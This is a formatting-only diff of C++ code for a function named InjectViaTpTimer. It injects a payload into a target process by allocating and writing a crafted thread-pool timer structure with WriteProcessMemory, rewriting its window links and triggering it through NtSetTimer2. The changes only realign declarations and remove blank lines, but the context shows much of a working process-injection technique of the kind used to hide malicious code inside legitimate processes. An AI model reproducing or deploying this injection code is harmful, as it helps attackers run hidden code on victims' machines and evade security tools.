@@ -3,12 +3,14 @@
 
 bool InjectViaTpTimer(_In_ HANDLE hWorkerFactory, _In_ HANDLE hTimer, _In_ void* payloadAddress, _In_ HANDLE targetProcess) {
 
-	WORKER_FACTORY_BASIC_INFORMATION workerFactoryInfo = { 0 };				PFULL_TP_TIMER remoteTpTimer = nullptr;
-	fnNtQueryInformationWorkerFactory pQueryWorkerFactory = nullptr;			PFULL_TP_TIMER pFullTpTimer = nullptr;
-	signed long long int timeOutInterval = -10000000;					LARGE_INTEGER dueTime = { 0 };
-	fnNtSetTimer2 pNtSetTimer2 = nullptr;							NTSTATUS status = ERROR_SUCCESS;
-
-
+	fnNtQueryInformationWorkerFactory pQueryWorkerFactory = nullptr;
+	WORKER_FACTORY_BASIC_INFORMATION workerFactoryInfo    = { 0 };				
+	PFULL_TP_TIMER remoteTpTimer   = nullptr;
+	PFULL_TP_TIMER pFullTpTimer    = nullptr;
+	long long timeOutInterval      = -10000000;					
+	LARGE_INTEGER dueTime          = { 0 };
+	fnNtSetTimer2 pNtSetTimer2     = nullptr;							
+	NTSTATUS status                = ERROR_SUCCESS;
 
 	pNtSetTimer2 = reinterpret_cast<fnNtSetTimer2>(
 		GetProcAddress(
@@ -20,13 +22,10 @@ bool InjectViaTpTimer(_In_ HANDLE hWorkerFactory, _In_ HANDLE hTimer, _In_ void*
 			GetModuleHandleW(L"NTDLL.DLL"),
 			"NtQueryInformationWorkerFactory"));
 
-
 	if (pQueryWorkerFactory == nullptr || pNtSetTimer2 == nullptr) {
 		std::cerr << "{!!} Failed to get NtQueryInformationWorkerFactory function pointer." << std::endl;
 		return false;
 	}
-
-
 
 	//
 	// Get worker factory basic information
@@ -44,8 +43,6 @@ bool InjectViaTpTimer(_In_ HANDLE hWorkerFactory, _In_ HANDLE hTimer, _In_ void*
 		return false;
 	}
 	
-
-
 	//
 	// Create callback structure associated with our payload
 	//
@@ -60,8 +57,6 @@ bool InjectViaTpTimer(_In_ HANDLE hWorkerFactory, _In_ HANDLE hTimer, _In_ void*
 		WIN32_ERR(CreateThreadPoolTimer);
 		return false;
 	}
-
-	
 
 	//
 	// Allocate memory for FULL_TP_TIMER structure
@@ -79,8 +74,6 @@ bool InjectViaTpTimer(_In_ HANDLE hWorkerFactory, _In_ HANDLE hTimer, _In_ void*
 		return false;
 	}
 	
-
-
 	//
 	// Modify some important members, and then write the structure
 	//
@@ -109,8 +102,6 @@ bool InjectViaTpTimer(_In_ HANDLE hWorkerFactory, _In_ HANDLE hTimer, _In_ void*
 		return false;
 	}
 
-	
-
 	//
 	// Change WindowStart.Root and WindowEnd.Root to point to the TP_TIMER callback
 	//
@@ -128,7 +119,6 @@ bool InjectViaTpTimer(_In_ HANDLE hWorkerFactory, _In_ HANDLE hTimer, _In_ void*
 		return false;
 	}
 
-
 	auto pTpTimerWindowEndLinks = &remoteTpTimer->WindowEndLinks;
 
 	if (!WriteProcessMemory(
@@ -141,8 +131,6 @@ bool InjectViaTpTimer(_In_ HANDLE hWorkerFactory, _In_ HANDLE hTimer, _In_ void*
 		WIN32_ERR(WriteProcessMemory( Third Call ));
 		return false;
 	}
-
-
 
 	//
 	// Trigger the callback
@@ -161,7 +149,6 @@ bool InjectViaTpTimer(_In_ HANDLE hWorkerFactory, _In_ HANDLE hTimer, _In_ void*
 		NTAPI_ERR(NtSetTimer2, status);
 		return false;
 	}
-
 
 	return true;
 }
